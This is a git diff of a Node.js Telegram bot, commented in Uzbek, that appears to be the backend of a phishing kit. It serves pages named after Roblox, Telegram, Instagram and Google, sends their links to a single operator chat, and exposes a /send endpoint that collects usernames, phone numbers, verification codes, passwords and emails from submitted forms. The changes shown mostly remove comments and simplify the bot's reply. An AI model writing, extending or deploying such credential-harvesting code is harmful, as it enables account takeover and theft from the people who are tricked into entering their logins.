@@ -5,14 +5,15 @@ const { Bot, Keyboard } = require("grammy");
 const TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = String(process.env.CHAT_ID);
 const PORT = process.env.PORT || 3000;
+
+// Render yoki boshqa hosting o'zi taqdim etadigan BASE_URL ni ishlatadi
 const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;
 
 const bot = new Bot(TOKEN);
 const app = express();
 app.use(express.json());
-app.use(express.static("public")); // faqat public papka ochiq
+app.use(express.static("public"));
 
-// Yangi fayl nomlariga moslangan kalitlar
 const labels = { 
   roblox: "Roblox", 
   telegram: "Telegram", 
@@ -20,12 +21,10 @@ const labels = {
   google: "Google" 
 };
 
-// tugma nomi -> kalit
 const byLabel = Object.fromEntries(
   Object.entries(labels).map(([key, label]) => [label, key])
 );
 
-// Telegram menyusidagi tugmalar
 const menu = new Keyboard()
   .text("Roblox").text("Telegram").row()
   .text("Instagram").text("Google")
@@ -36,7 +35,6 @@ bot.command("start", (ctx) => {
   return ctx.reply("✨ Menyuni tanlang:", { reply_markup: menu });
 });
 
-// Tugma bosilganda chiroyli formatlangan havolani yuborish
 bot.on("message:text", async (ctx) => {
   if (String(ctx.chat.id) !== CHAT_ID) return;
   const key = byLabel[ctx.message.text];
@@ -44,15 +42,8 @@ bot.on("message:text", async (ctx) => {
 
   const url = `${BASE_URL}/${key}.html`;
 
-  const messageText = 
-`🔐 <b>${ctx.message.text} Sahifasi</b>
-
-🌐 <b>Sahifa havolasi:</b>
-${url}`;
-
-  return ctx.reply(messageText, {
-    parse_mode: "HTML",
-    disable_web_page_preview: false
+  return ctx.reply(`🔐 <b>${ctx.message.text} Sahifasi</b>\n\n🌐 <b>Havola:</b>\n${url}`, {
+    parse_mode: "HTML"
   });
 });
 
@@ -61,7 +52,6 @@ bot.catch((err) => console.error("Bot xatosi:", err.message));
 app.post("/send", async (req, res) => {
   try {
     const { source, username, phone, code, password, email, field, value } = req.body;
-
     let text = "";
 
     if (field && value) {
